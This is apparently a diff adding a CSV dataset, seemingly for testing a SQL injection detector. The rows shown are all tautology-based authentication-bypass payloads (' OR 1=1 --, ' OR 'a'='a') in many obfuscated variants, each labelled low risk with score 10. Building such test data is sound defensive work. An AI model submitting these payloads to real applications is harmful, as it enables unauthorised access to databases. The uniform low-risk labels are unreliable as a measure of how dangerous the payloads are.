@@ -1,0 +1,5001 @@
+Query,Risk Level,Expected Score
+' OR 1=1 --,low,10
+'+OR+1=1+--,low,10
+'/**/OR/**/1=1/**/--/**//*/**/TEST/**/*/,low,10
+' or 1=1 --,low,10
+'/**/OR/**/1=1/**/--,low,10
+'%20||%201=1%20--,low,10
+' OR 1=1 -- /* test */ # MySQL comment,low,10
+' || 1=1 -- -- QmOuo # cmwIuyI,low,10
+""" OR 1=1 --",low,10
+'%20OR%201=1%20--,low,10
+' OR 1=1 -- -- fmtSDl,low,10
+' OR 1=1 -- # tnMkt,low,10
+' or 1=1 -- /* TesT */,low,10
+' OR 1=1 -- -- FtgADQqtfb,low,10
+' OR 1=1 -- # MySQL comment,low,10
+' OR 1=1 #,low,10
+' OR 1=1 -- -- pwXjhl,low,10
+'+OR+1=1+-- # PCPnkOHGU,low,10
+'/**/OR/**/1=1/**/--/**//*/**/test/**/*/,low,10
+' or 1=1 #,low,10
+'	OR	1=1	-- /* test */,low,10
+""" || 1=1 --",low,10
+' Or 1=1 -- -- kpWkAN,low,10
+' or 1=1 -- /* TEst */,low,10
+'++OR++1=1++--,low,10
+' OR 1=1 -- /* test */,low,10
+'+OR+1=1+-- -- gxyhTccLg # HkHoXfnGCz,low,10
+' OR 1=1 -- -- gAFJaZ /* test */,low,10
+' OR 1=1 -- # dDutGL # MySQL comment,low,10
+'+or+1=1+-- -- cOmmENt,low,10
+' OR 1=1 -- -- comment,low,10
+' OR 1=1 -- -- aydkDL,low,10
+' OR 1=1 -- # iasHusrgu,low,10
+' Or 1=1 #,low,10
+'+or+1=1+#,low,10
+' OR 1=1 -- -- qzigw -- lXlRIKvJWG,low,10
+' OR 1=1 -- -- FscbS -- oYuGWQyK,low,10
+' oR 1=1 --,low,10
+'	OR	1=1	--,low,10
+' OR 1=1 -- # MYSQL COMMENT # CHZROYIK,low,10
+'+OR+1=1+--+#+MySQL+comment,low,10
+' OR 1=1 -- -- QiuYR,low,10
+'%20OR%201=1%20--%20#%20ukikZwwd,low,10
+' OR 1=1 -- -- kHPewge,low,10
+' OR 1=1 -- -- bFxqYUqcLB,low,10
+'	OR	1=1	-- # MySQL comment -- comment,low,10
+' OR 1=1 -- -- UGSSNocM,low,10
+'+OR+1=1+--+#+MySQL+comment # MySQL comment,low,10
+'%20or%201=1%20--,low,10
+'+||+1=1+--,low,10
+'%20OR%201=1%20--%20#%20IjQhxLCE,low,10
+'%20OR%201=1%20-- # RdUhy # WhcSgUwO,low,10
+'	or	1=1	--,low,10
+"""+OR+1=1+--",low,10
+' OR 1=1 -- # PfJvKmEp /* test */,low,10
+' OR 1=1 -- # dPOGXHadsN,low,10
+' oR 1=1 -- -- comment,low,10
+'+OR+1=1+-- -- VUZSx -- NdGFVrnqpl,low,10
+' OR 1=1 -- /* TEST */,low,10
+'+OR+1=1+#,low,10
+' || 1=1 -- /* test */,low,10
+' || 1=1 --,low,10
+'+OR+1=1+-- # cesptYCdIO,low,10
+'+OR+1=1+--+--+comment,low,10
+' oR 1=1 -- # agHVXha,low,10
+'/**/OR/**/1=1/**/#,low,10
+' OR 1=1 -- -- nIomzqO,low,10
+'  or  1=1  --,low,10
+' OR 1=1 -- # NjogT /* test */,low,10
+'	OR	1=1	#,low,10
+' or 1=1 -- # mYsql COMMENT,low,10
+'%20OR%201=1%20#%20#%20JzftjhSVwZ,low,10
+' || 1=1 #,low,10
+' Or 1=1 --,low,10
+' || 1=1 -- # MySQL comment # MySQL comment,low,10
+' Or 1=1 -- # MYSQL ComMenT,low,10
+'	||	1=1	--,low,10
+"""/**/OR/**/1=1/**/--",low,10
+'	or	1=1	--	/*	TEST	*/,low,10
+"""	OR	1=1	--",low,10
+' OR 1=1 -- -- KbbNayrk,low,10
+'	Or	1=1	--,low,10
+' or 1=1 -- /* test */,low,10
+""" OR 1=1 -- # MySQL comment",low,10
+'+oR+1=1+--,low,10
+' or 1=1 -- # KYCRdwLPbP,low,10
+'/**/or/**/1=1/**/--,low,10
+'%20OR%201=1%20-- # MySQL comment,low,10
+'+OR+1=1+-- -- comment,low,10
+'+or+1=1+--+/*+test+*/,low,10
+""" or 1=1 -- /* test */",low,10
+'%20OR%201=1%20--%20#%20MySQL%20comment,low,10
+' OR 1=1 -- -- LIiMM # kHGBQEoF,low,10
+'+OR+1=1+--+/*+test+*/+/*+test+*/,low,10
+' OR 1=1 # # COmmENt,low,10
+'  OR  1=1  -- # NxsgGu,low,10
+' OR 1=1 -- -- OTciU,low,10
+' OR 1=1 -- -- comment # NcKiFMmiox,low,10
+' OR 1=1 -- # wkWoqDi -- gKQOOWtiO,low,10
+' or 1=1 -- /* TEST */,low,10
+' OR 1=1 -- # JxNoFqqMDi,low,10
+'	OR	1=1	--	--	izUpgmTYK,low,10
+"""	||	1=1	#",low,10
+' OR 1=1 -- /* TesT */ # MYSql coMmeNt,low,10
+'%20||%201=1%20-- -- pSMae,low,10
+' or 1=1 -- -- COMMENT,low,10
+' OR 1=1 -- # MySQL comment # MySQL comment,low,10
+"""	or	1=1	--",low,10
+'+or+1=1+--,low,10
+'+OR+1=1+-- # xVEmF,low,10
+'+or+1=1+-- # IbLMRsLg,low,10
+'	||	1=1	-- -- FpPkl -- comment,low,10
+' OR 1=1 -- # SYBHHCXLAT /* test */ /* test */,low,10
+'/**/or/**/1=1/**/--/**/#/**/LVoFGtiv,low,10
+'	OR	1=1	--+/*+test+*/,low,10
+'	or	1=1	--	--	comment,low,10
+' || 1=1 -- -- XMacj,low,10
+'+OR+1=1+# # bdJHlpobV,low,10
+""" or 1=1 -- # MySQL comment",low,10
+'%20OR%201=1%20--	--	COMMENT,low,10
+"""	||	1=1	--",low,10
+' or 1=1 # -- hTZNBxIRHx,low,10
+"""	OR	1=1	-- # DKeufKr",low,10
+"""	or	1=1	-- /* test */",low,10
+' OR 1=1 -- # IiYLUL,low,10
+""" || 1=1 -- # MySQL comment",low,10
+'%20OR%201=1%20-- # SbpkV,low,10
+'/**/||/**/1=1/**/--,low,10
+' oR 1=1 -- # zjKvs,low,10
+'%20OR%201=1%20--%20/*%20test%20*/%20#%20MZDbUQ,low,10
+' OR 1=1 -- # phFzIbux -- comment # MySQL comment,low,10
+'/**//**/or/**//**/1=1/**//**/--/**//*/**/TEST/**/*/,low,10
+'/**/||/**/1=1/**/--/**//*/**/test/**/*/,low,10
+' OR 1=1 -- -- BFijr # MySQL comment,low,10
+' OR 1=1 -- # LHOOSXP,low,10
+'	OR	1=1	--	#	aVuwasYR,low,10
+' || 1=1 -- -- comment -- comment,low,10
+'%20OR%201=1%20-- /* TEST */,low,10
+' or 1=1 -- /* test */ -- lzoSWOr,low,10
+'+Or+1=1+--+--+comMenT,low,10
+'	Or	1=1	-- -- yVoGdP,low,10
+""" OR 1=1 -- -- uTtdjUoq",low,10
+'	OR	1=1	#	#	comment	/*	test	*/,low,10
+"""	OR	1=1	--	--	dPqFN",low,10
+' || 1=1 -- -- dhVwRyt,low,10
+' or 1=1 -- -- JguCFec # DgklAd,low,10
+"""/**/||/**/1=1/**/--/**/#/**/MySQL/**/comment",low,10
+'+OR+1=1+#+#+JFJnV,low,10
+'	or	1=1	#,low,10
+""" || 1=1 -- # RGRDJQp",low,10
+' OR 1=1 -- /* test */ /* test */ -- drhSVOIN,low,10
+' Or 1=1 -- # MySQL comment,low,10
+' OR 1=1 # # WqdUSFs # PlCWYuDBBQ,low,10
+' OR 1=1 # # HrgCwVhd,low,10
+'%20or%201=1%20--%20--%20comment,low,10
+' OR 1=1 # # WyusmloA,low,10
+' OR 1=1 -- -- comment /* test */,low,10
+'%20OR%201=1%20--%20--%20SCAEEHYER,low,10
+' Or 1=1 -- /* test */ # MySQL comment /* test */,low,10
+'	OR	1=1	--+#+MySQL+comment+--+xhpRtj,low,10
+""" or 1=1 --",low,10
+'/**/or/**/1=1/**/--/**/#/**/pRmQuFO,low,10
+'+OR+1=1+--+/*+test+*/,low,10
+'/**/OR/**/1=1/**/-- # UDCfmicNu,low,10
+'+or+1=1+-- # zytieaxyh,low,10
+'+OR+1=1+-- /* test */,low,10
+' OR 1=1 -- -- NEAhYgeNjY,low,10
+'%20OR%201=1%20--%20/*%20test%20*/,low,10
+' or 1=1 -- # mysql comment,low,10
+' OR 1=1 -- -- comment -- EKKqLKk,low,10
+'/**/OR/**/1=1/**/--/**/--/**/comment/**/#/**/MySQL/**/comment # VhjVqBz,low,10
+' OR 1=1 # # MySQL comment -- SvKHXUJ,low,10
+'/**/OR/**/1=1/**/--/**/#/**/MySQL/**/comment,low,10
+'/**/or/**/1=1/**/#/**/#/**/kaYjOO,low,10
+' OR 1=1 -- # MYSQL COMMENT,low,10
+' OR 1=1 -- /* test */ # ClGauzGb,low,10
+' OR 1=1 # # MySQL comment,low,10
+'	OR	1=1	-- -- prNqqg,low,10
+'/**/oR/**/1=1/**/-- /* TeSt */ -- pMsQDR,low,10
+' or 1=1 -- -- comment -- comment # CLZeolEj,low,10
+'%20OR%201=1%20--%20--%20comment,low,10
+' OR 1=1 # # EKDDTYOBEP,low,10
+"""%20OR%201=1%20--",low,10
+"""/**/OR/**/1=1/**/--/**//*/**/TEST/**/*/ # XBQPEWP",low,10
+' or 1=1 -- -- hfartk,low,10
+' OR 1=1 # -- comment,low,10
+""" or 1=1 # # COMMENT",low,10
+'+or+1=1+--/**/#/**/mysql/**/comment,low,10
+' OR 1=1 -- -- GFLQPGR # TQOGXB,low,10
+"""+or+1=1+--",low,10
+' || 1=1 -- -- comment # MySQL comment /* test */,low,10
+'	OR	1=1	#	#	MySQL	comment,low,10
+'%20OR%201=1%20--%20#%20rAozfxyFdC,low,10
+'/**/OR/**/1=1/**/--	/*	test	*/,low,10
+' OR 1=1 -- /* test */ -- GjWygnikyC,low,10
+' or 1=1 -- -- comment,low,10
+'	OR	1=1	--	/*	test	*/,low,10
+' || 1=1 -- /* test */ # bkWYVsw,low,10
+' Or 1=1 -- # Hskvpobti,low,10
+""" or 1=1 -- -- comment # SNkXwC",low,10
+'/**/or/**/1=1/**/--/**//*/**/test/**/*/,low,10
+"""	oR	1=1	#",low,10
+' or 1=1 -- # MysQl COmmenT,low,10
+"""/**/or/**/1=1/**/--",low,10
+'	||	1=1	--	--	comment # MySQL comment,low,10
+'/**/OR/**/1=1/**/--/**//*/**/test/**/*/ # HMMSoZBux,low,10
+'	or	1=1	-- # yqqbvzeaqo,low,10
+'	OR	1=1	-- /* TEST */,low,10
+'+OR+1=1+--+/*+test+*/ -- ZkfnZNBAyd /* test */,low,10
+""" or 1=1 -- -- dankttv",low,10
+'/**/or/**/1=1/**/-- -- comment,low,10
+' or 1=1 # /* test */,low,10
+'	or	1=1	--	#	mYsql	COMMENT,low,10
+"""%20Or%201=1%20--",low,10
+' OR 1=1 -- -- comment # byioE,low,10
+'+or+1=1+-- /* test */,low,10
+' OR 1=1 -- -- ComMEnt -- jENzQtjh,low,10
+'+OR+1=1+-- # AnLWtIV,low,10
+'	or	1=1	#	#	MySQL	comment,low,10
+'%20or%201=1%20#%20/*%20test%20*/,low,10
+""" OR 1=1 -- -- cvUzyGN",low,10
+' OR 1=1 -- # iKAJpIy,low,10
+'	||	1=1	-- -- comment,low,10
+'  OR  1=1  --  #  nHzGqnOsT -- EddeSakW,low,10
+'/**/OR/**/1=1/**/-- # URBMSMXGXZ /* TEST */,low,10
+'+OR+1=1+--+--+IrdRAW -- comment,low,10
+""" OR 1=1 -- # oeRjHgDH # LrNxqUaH",low,10
+'/**/OR/**/1=1/**/--/**/--/**/comment,low,10
+"""%20or%201=1%20--%20/*%20test%20*/",low,10
+' oR 1=1 # # mYsql COMMENT,low,10
+' OR 1=1 # # comment # MySQL comment,low,10
+""" or 1=1 # # stPJSXGUKm",low,10
+'/**/||/**/1=1/**/--/**/#/**/doYmdiLk/**//*/**/test/**/*/,low,10
+'+OR+1=1+-- # MySQL comment /* test */,low,10
+"""	OR	1=1	#	#	MySQL	comment",low,10
+'	OR	1=1	#	#	PUCHEEQVJ,low,10
+""" or 1=1 -- -- UVEBHKqP",low,10
+'/**/OR/**/1=1/**/-- # XJrpaJkSIy,low,10
+'	or	1=1	-- /* TEST */ /* test */,low,10
+' || 1=1 # # GuPlHHODsU,low,10
+' or 1=1 -- # nfkOh,low,10
+"""	OR	1=1	--	#	mRDmPI	/*	test	*/",low,10
+""" OR 1=1 -- # sbGaCyeHI",low,10
+"""%20OR%201=1%20#",low,10
+' OR 1=1 -- # NWQEJHCWS,low,10
+'/**/Or/**/1=1/**/--/**//*/**/teST/**/*/,low,10
+"""		OR		1=1		--",low,10
+'/**/OR/**/1=1/**/--/**/#/**/gZkBzjb/**/--/**/EIEpQy/**/--/**/comment,low,10
+""" OR 1=1 -- -- KOPADNAV",low,10
+' OR 1=1 # /* test */ # MySQL comment -- comment,low,10
+' OR 1=1 -- /* test */,low,10
+' OR 1=1 -- /* test */ /* test */,low,10
+'%20OR%201=1%20--%20/*%20test%20*/,low,10
+' OR 1=1 -- /* test */ # jldcpZgGJy,low,10
+'/**/OR/**/1=1/**/--/**//*/**/test/**/*/+#+MySQL+comment,low,10
+' OR 1=1 -- /* test */ # MySQL comment -- RBYOIRTG -- AqHIUSg,low,10
+' OR 1=1 -- /* TEST */,low,10
+' OR 1=1 -- /* test */ # xRcUok,low,10
+'/**/OR/**/1=1/**/--/**//*/**/test/**/*//**/--/**/comment,low,10
+'+OR+1=1+--+/*+test+*/,low,10
+'+OR+1=1+--+/*+test+*/ /* test */,low,10
+'+OR+1=1+--+/*+TEST+*/,low,10
+' || 1=1 -- /* test */,low,10
+' OR 1=1 # /* test */ # MkOMQMGXYZ,low,10
+' or 1=1 -- /* test */,low,10
+'  OR  1=1  --  /*  test  */,low,10
+' OR 1=1 -- /* test */ -- comment,low,10
+' OR 1=1 -- /* test */ -- bKHZd,low,10
+' OR 1=1 # /* test */,low,10
+' OR 1=1 -- /* test */ -- vyuniUvJGw,low,10
+' or 1=1 -- /* TEST */ # bNBPoLRFOL -- comment,low,10
+' OR 1=1 -- /* test */ # cJwqfdN,low,10
+'/**/OR/**/1=1/**/--/**//*/**/test/**/*//**/--/**/ldCUE,low,10
+'%20OR%201=1%20--%20/*%20test%20*/ -- IRKkbKZhja,low,10
+' or 1=1 -- /* TEST */,low,10
+' OR 1=1 -- /* TEST */ -- comment,low,10
+""" OR 1=1 -- /* test */ # pFJHq",low,10
+'%20OR%201=1%20--%20/*%20test%20*/ # MySQL comment,low,10
+' OR 1=1 -- /* test */ # kPNyHGr,low,10
+' OR 1=1 -- /* test */ # Wmutr,low,10
+' OR 1=1 -- /* test */ # mIjVyXFn,low,10
+'/**/OR/**/1=1/**/--/**//*/**/test/**/*/,low,10
+' Or 1=1 -- /* test */,low,10
+' oR 1=1 -- /* TESt */ # dPGQhQ,low,10
+'+or+1=1+--+/*+test+*/+--+comment,low,10
+'/**/OR/**/1=1/**/--/**//*/**/test/**/*//**/#/**/YDocmM,low,10
+' OR 1=1 -- /* TEST */ /* TEST */,low,10
+'	Or	1=1	--	/*	tEST	*/,low,10
+' OR 1=1 -- /* test */ -- QNefx,low,10
+' OR 1=1 -- /* test */ # DJMbRFBm,low,10
+'+||+1=1+--+/*+test+*/,low,10
+'	||	1=1	--	/*	test	*/,low,10
+' || 1=1 -- /* test */ -- comment,low,10
+' OR 1=1 -- /* test */ # TamCIbe,low,10
+' OR 1=1 -- /* test */ -- THziu,low,10
+' OR 1=1 -- /* test */ # MySQL comment,low,10
+' or 1=1 -- /* TEST */ # mYsql COMMENT,low,10
+'+or+1=1+--+/*+test+*/,low,10
+'	OR	1=1	--	/*	test	*/,low,10
+' OR 1=1 -- /* test */ -- NoROTj,low,10
+""" OR 1=1 -- /* test */ /* test */",low,10
+"""/**/or/**/1=1/**/--/**//*/**/test/**/*/",low,10
+""" OR 1=1 -- /* test */ # MySQL comment",low,10
+""" OR 1=1 -- /* TEST */",low,10
+'%20Or%201=1%20--%20/*%20TeSt%20*/,low,10
+' OR 1=1 -- /* test */ # ufRot,low,10
+' oR 1=1 -- /* TEsT */,low,10
+' OR 1=1 -- /* test */ -- wnAanJcvVJ,low,10
+' OR 1=1 -- /* test */ -- comment -- comment,low,10
+' OR 1=1 # /* test */ # BUMbygK,low,10
+' OR 1=1 -- /* test */ # MpAqK /* test */,low,10
+'+||+1=1+--+/*+test+*/ # MySQL comment,low,10
+'/**/OR/**/1=1/**/--/**//*/**/test/**/*/ -- IyUDQ,low,10
+'	OR	1=1	--	/*	test	*/ -- SwMNR,low,10
+'/**/OR/**/1=1/**/#/**//*/**/test/**/*/,low,10
+'%20or%201=1%20--%20/*%20test%20*/,low,10
+' Or 1=1 -- /* tEst */,low,10
+' OR 1=1 -- /* tEst */,low,10
+' or 1=1 -- /* test */ # MySQL comment,low,10
+'/**/OR/**/1=1/**/--/**//*/**/TEST/**/*/,low,10
+""" OR 1=1 -- /* test */",low,10
+'%20oR%201=1%20--%20/*%20teST%20*/,low,10
+'%20OR%201=1%20--%20/*%20test%20*/%20/*%20test%20*/ # MySQL comment,low,10
+' || 1=1 -- /* test */ -- mkEVOqMcov,low,10
+' OR 1=1 -- /* test */ -- LtZwsokjri,low,10
+'	OR	1=1	--	/*	test	*/	#	MySQL	comment,low,10
+' OR 1=1 -- /* test */ # sBLJCPG,low,10
+' or 1=1 -- /* test */ # MySQL comment /* test */,low,10
+' OR 1=1 -- /* test */ # AdAaJ /* test */,low,10
+'+or+1=1+--+/*+teSt+*/,low,10
+'	OR	1=1	--	/*	test	*/ -- hEYdLlzLS,low,10
+' or 1=1 -- /* test */ /* test */,low,10
+' or 1=1 -- /* TEST */ # CXDYvAFr # MySQL comment,low,10
+' || 1=1 -- /* test */ /* test */,low,10
+"""/**/oR/**/1=1/**/--/**//*/**/tesT/**/*/",low,10
+' OR 1=1 # /* test */ # MySQL comment,low,10
+' Or 1=1 -- /* TeST */ # MySQL comment,low,10
+'  OR  1=1  --  /*  test  */ -- comment,low,10
+'%20OR%201=1%20#%20/*%20test%20*/,low,10
+' OR 1=1 -- /* test */ /* test */ /* test */,low,10
+'	OR	1=1	--	/*	test	*/ # MySQL comment,low,10
+'	OR	1=1	--	/*	test	*/	#	DhHWhD,low,10
+'%20||%201=1%20--%20/*%20test%20*/,low,10
+' OR 1=1 -- /* TEST */ -- uPgxh,low,10
+'+OR+1=1+--+/*+test+*/ # MySQL comment,low,10
+"""  OR  1=1  --  /*  test  */",low,10
+'+OR+1=1+--+/*+test+*/ # FTCCcPJ,low,10
+' OR 1=1 -- /* test */ /* test */ # nNlBV,low,10
+' or 1=1 -- /* test */ -- QwoJvf,low,10
+' or 1=1 -- /* TEST */ -- TDMRfHp,low,10
+'%20OR%201=1%20--%20/*%20test%20*/%20--%20comment,low,10
+'%20OR%201=1%20#%20/*%20test%20*/%20#%20comment,low,10
+'	OR	1=1	#	/*	test	*/,low,10
+' OR 1=1 -- /* test */ # MySQL comment /* test */,low,10
+' OR 1=1 -- /* test */ # KdjRTeLBH,low,10
+'+OR+1=1+#+/*+test+*/ # Iuwcsmi,low,10
+'	OR	1=1	--	/*	test	*/	/*	test	*/,low,10
+'%20OR%201=1%20--%20/*%20test%20*/%20#%20AsxaJRJT,low,10
+' || 1=1 -- /* test */ # pruoK,low,10
+'/**/OR/**/1=1/**/--/**//*/**/test/**/*/ -- comment,low,10
+'	OR	1=1	--	/*	test	*/ -- comment,low,10
+'	OR	1=1	--	/*	test	*/	/*	test	*/ -- uqIKMNGbe,low,10
+' OR 1=1 -- /* TEST */ # XSHYI,low,10
+' OR 1=1 -- /* test */ /* test */ # cHoVwUMaj,low,10
+'	or	1=1	--	/*	test	*/,low,10
+'+Or+1=1+--+/*+TeSt+*/+/*+TeST+*/,low,10
+'%20or%201=1%20--%20/*%20TEST%20*//**/#/**/mYsql/**/COMMENT,low,10
+'%20OR%201=1%20--%20/*%20TEST%20*/,low,10
+'	or	1=1	--	/*	TEST	*/ # MySQL comment,low,10
+'+OR+1=1+#+/*+test+*/+--+HmyKjp,low,10
+'+OR+1=1+--+/*+test+*/+--+sVGKLs,low,10
+"""+or+1=1+--+/*+TeST+*/",low,10
+' OR 1=1 -- /* TEst */ /* TeST */,low,10
+'/**/||/**/1=1/**/--/**//*/**/TEST/**/*/,low,10
+"""/**/OR/**/1=1/**/--/**//*/**/test/**/*/",low,10
+'%20OR%201=1%20--%20/*%20test%20*/ -- lraePR,low,10
+' || 1=1 -- /* TeSt */,low,10
+'%20%20OR%20%201=1%20%20--%20%20/*%20%20test%20%20*/,low,10
+' OR 1=1 -- /* teSt */ # MySqL COMment # mysqL ComMENT,low,10
+' OR 1=1 -- /* test */ # eftmtflMxd,low,10
+""" OR 1=1 -- /* test */ # leDnwSm",low,10
+' oR 1=1 -- /* TeST */ /* test */,low,10
+'+||+1=1+--+/*+TEST+*/,low,10
+""" OR 1=1 -- /* test */ # mBJFZJUSK",low,10
+' OR 1=1 -- /* test */ /* test */ # EBLdsVA,low,10
+' or 1=1 -- /* test */ # cdSjm -- ZGBTAQNXV,low,10
+""" OR 1=1 -- /* test */ -- comment",low,10
+'	OR	1=1	--	/*	test	*/	#	VCuxu,low,10
+' OR 1=1 -- /* test */ # MySQL comment # bWtap,low,10
+' OR 1=1 -- /* TEST */ -- ioCZtd,low,10
+'%20OR%201=1%20#%20/*%20test%20*/%20--%20sxjBrRL,low,10
+'%20OR%201=1%20--%20/*%20test%20*/ -- comment,low,10
+' OR 1=1 -- /* test */ # WGaCjw # MySQL comment -- apBugk,low,10
+'%20OR%201=1%20--%20/*%20test%20*/%20--%20ktBCMLrTh,low,10
+' OR 1=1 # /* TEST */,low,10
+'+or+1=1+#+/*+test+*/,low,10
+' OR 1=1 -- /* test */ -- XXeIjYvsum # YAlGIuYRZX -- comment,low,10
+' OR 1=1 -- /* test */ # jxoeDzWD,low,10
+""" or 1=1 -- /* TEST */",low,10
+' OR 1=1 -- /* TEST */ -- COMMENT -- comment,low,10
+'+OR+1=1+--+/*+test+*/+/*+test+*/,low,10
+' || 1=1 -- /* tEst */ -- EYhynB # KSWjFxW,low,10
+'+||+1=1+--+/*+TEST+*/ /* test */,low,10
+' OR 1=1 -- /* TEST */ # MySQL comment,low,10
+'+OR+1=1+--+/*+test+*/	--	UetDGuGJGo,low,10
+'/**/or/**/1=1/**/--/**//*/**/test/**/*/ /* test */,low,10
+'+or+1=1+--+/*+TEST+*/+--+comment # MySQL comment,low,10
+' or 1=1 # /* TEST */ # MySQL comment,low,10
+'+or+1=1+#+/*+TEST+*/+--+GyIIvgKc+--+comment,low,10
+'+OR+1=1+--+/*+test+*/ # kxhvqjBLzm,low,10
+' oR 1=1 -- /* test */ # dCpagIS,low,10
+' OR 1=1 # /* TEST */ # NPZUSCCFCV /* test */,low,10
+'%20or%201=1%20--%20/*%20test%20*/ -- comment,low,10
+""" or 1=1 -- /* test */ # JGXsmo -- comment",low,10
+'/**/OR/**/1=1/**/#/**//*/**/test/**/*//**/#/**/RkmvUHLFE/**//*/**/test/**/*/,low,10
+""" || 1=1 -- /* test */",low,10
+'%20or%201=1%20--%20/*%20TEST%20*/,low,10
+' OR 1=1 -- /* TEST */ -- COMMENT,low,10
+'/**/OR/**/1=1/**/--/**//*/**/test/**/*//**/#/**/qYENBDtaC,low,10
+'	OR	1=1	--	/*	test	*/ /* test */,low,10
+'+Or+1=1+--+/*+TESt+*/,low,10
+'%20||%201=1%20--%20/*%20TEST%20*/%20--%20LJnqJp,low,10
+'+OR+1=1+--+/*+test+*/ # kniqBw,low,10
+"""%20OR%201=1%20--%20/*%20test%20*/ -- gfqobrRN",low,10
+'/**/OR/**/1=1/**/--/**//*/**/TEST/**/*/ # MySQL comment -- EWGaAhiC,low,10
+'+or+1=1+--+/*+test+*/ # ltbneclyhf,low,10
+'/**/or/**/1=1/**/--/**//*/**/TEST/**/*/ # jxJyVZLEC,low,10
+'	OR	1=1	--	/*	TEST	*/,low,10
+""" or 1=1 -- /* test */",low,10
+'	OR	1=1	--	/*	test	*/+#+siBzhH,low,10
+'	OR	1=1	--	/*	test	*/	#	SYdPdq # hjofP,low,10
+' or 1=1 -- /* TeSt */ -- DpObH,low,10
+' OR 1=1 -- /* test */ # MySQL comment # MySQL comment,low,10
+'+or+1=1+--+/*+Test+*/,low,10
+' OR 1=1 # /* test */ # llNDV -- comment,low,10
+' or 1=1 -- /* test */ # swhcrtj,low,10
+' || 1=1 -- /* test */ -- hKIQahfu,low,10
+'	or	1=1	--	/*	TEST	*/,low,10
+'+OR+1=1+#+/*+test+*/ -- comment,low,10
+' || 1=1 -- /* TEST */ -- comment,low,10
+' OR 1=1 -- /* test */ -- oOdyyXT # STsgxA # MySQL comment # nEmIVZxSp,low,10
+'%20or%201=1%20--%20/*%20test%20*/ # MySQL comment,low,10
+' or 1=1 -- /* tESt */ /* TESt */,low,10
+'/**//**/OR/**//**/1=1/**//**/--/**//**//*/**//**/test/**//**/*/+--+tKNmT,low,10
+' OR 1=1 -- /* teST */ # aZfAm,low,10
+'+OR+1=1+--+/*+test+*/+#+ZGAOxfSySH,low,10
+'	OR	1=1	--	/*	test	*/	--	kPErmKVi,low,10
+'	OR	1=1	--	/*	test	*/ -- OSXnXUKwIU,low,10
+'+||+1=1+--+/*+TEST+*/+#+INSTPOEMIG,low,10
+'%20or%201=1%20--%20/*%20test%20*/%20--%20comment,low,10
+'%20OR%201=1%20--%20/*%20TEST%20*/%20--%20COMMENT%20#%20vsmajYst,low,10
+'/**/Or/**/1=1/**/#/**//*/**/teST/**/*/,low,10
+"""%20or%201=1%20--%20/*%20Test%20*/ /* TEsT */",low,10
+' OR 1=1 -- /* test */ /* test */ -- mpCMlp,low,10
+' || 1=1 -- /* TeST */,low,10
+'+OR+1=1+--+/*+TEST+*/ # MySQL comment,low,10
+' or 1=1 -- /* test */ -- alziydz,low,10
+'	OR	1=1	--	/*	test	*//**//*/**/test/**/*/,low,10
+'%20OR%201=1%20--%20/*%20test%20*/%20--%20comment%20#%20MySQL%20comment,low,10
+""" or 1=1 -- /* test */ -- gzafrcbuy",low,10
+'+OR+1=1+#+/*+test+*/ # MySQL comment # qmasMNDUf,low,10
+'+OR+1=1+--+/*+test+*/+#+ZeYhiy # RPVJbrGQ,low,10
+'/**/or/**/1=1/**/--/**//*/**/test/**/*/,low,10
+' oR 1=1 -- /* tEsT */,low,10
+' OR 1=1 -- /* TEST */ # VTXOFTKKL,low,10
+'/**/OR/**/1=1/**/--/**//*/**/TEST/**/*//**/--/**/TONITOCYLL,low,10
+'/**/||/**/1=1/**/--/**//*/**/test/**/*/ # MySQL comment -- hnZWrgTKt,low,10
+"""%20OR%201=1%20--%20/*%20test%20*/ -- gjygNbyaA",low,10
+' || 1=1 # /* test */,low,10
+'%20oR%201=1%20#%20/*%20tesT%20*/,low,10
+' OR 1=1 -- /* test */ /* test */ # mYsql COMMENT,low,10
+'/**/||/**/1=1/**/--/**//*/**/TesT/**/*/,low,10
+' || 1=1 -- /* TEST */,low,10
+' OR 1=1 # /* test */ /* test */ -- comment,low,10
+'/**/or/**/1=1/**/--/**//*/**/TEST/**/*//**/--/**/ZrRnnLyjS,low,10
+'	OR	1=1	--	/*	test	*/	#	MySQL	comment	#	MySQL	comment,low,10
+' OR 1=1 -- /* test */ # mMejIIFu # AWXmSU,low,10
+'/**/or/**/1=1/**/--/**//*/**/TEST/**/*/,low,10
+' || 1=1 -- /* test */ # MySQL comment -- ObXBmyc,low,10
+'+or+1=1+#+/*+TEST+*/,low,10
+' OR 1=1 -- /* TEST */ # XOCHWHK,low,10
+'%20OR%201=1%20#%20/*%20test%20*/ # oCJXJdiE,low,10
+' oR 1=1 -- /* tEST */,low,10
+'/**/||/**/1=1/**/--/**//*/**/Test/**/*/,low,10
+'+OR+1=1+--+/*+test+*/ -- TgssDK,low,10
+""" or 1=1 # /* test */",low,10
+'%20OR%201=1%20--%20/*%20test%20*/%20/*%20test%20*/,low,10
+' OR 1=1 -- /* test */ # MySQL comment -- vTQTB,low,10
+'  OR  1=1  --  /*  TeST  */  #  mYsql  coMMENT,low,10
+'+OR+1=1+#+/*+test+*/ # groKEZZ,low,10
+"""/**/OR/**/1=1/**/--/**//*/**/TEST/**/*/",low,10
+'%20or%201=1%20#%20/*%20TEST%20*/,low,10
+'%20Or%201=1%20--%20/*%20Test%20*/,low,10
+'	OR	1=1	--	/*	test	*/	--	puMuOi,low,10
+""" or 1=1 -- /* test */ # MySQL comment",low,10
+' OR 1=1 -- /* TEST */ -- NRCAIC,low,10
+'/**/Or/**/1=1/**/--/**//*/**/TEst/**/*/,low,10
+' OR 1=1 -- /* test */ -- RJiKfl,low,10
+'	||	1=1	--	/*	test	*/	--	comment,low,10
+'%20||%201=1%20--%20/*%20test%20*/%20#%20MySQL%20comment,low,10
+' OR 'a'='a',low,10
+' OR 'a'='a' # comment # HTQNkz,low,10
+"""+OR+""a""=""a""",low,10
+'+or+'a'='a',low,10
+'/**/OR/**/'a'='a',low,10
+' OR 'a'='a' -- icRdXBFALx,low,10
+' oR 'A'='a',low,10
+'%20OR%20'a'='a',low,10
+' or 'A'='A',low,10
+""" OR ""a""=""a""",low,10
+'+OR+'a'='a',low,10
+'	OR	'a'='a',low,10
+' OR 'a'='a' # XFNDAKLUHe,low,10
+' OR 'a'='a' # MySQL comment,low,10
+""" OR ""a""=""a"" -- comment",low,10
+' or 'A'='A' -- fnqsKbqsQa,low,10
+' or 'A'='A' -- NKorPp,low,10
+' OR 'a'='a' -- CpWFJ,low,10
+' OR 'a'='a' -- lPJMmdq,low,10
+'+OR+'a'='a'+/*+test+*/,low,10
+' OR 'A'='A' -- KYXLLE,low,10
+' OR 'a'='a' -- comment,low,10
+' or 'a'='a',low,10
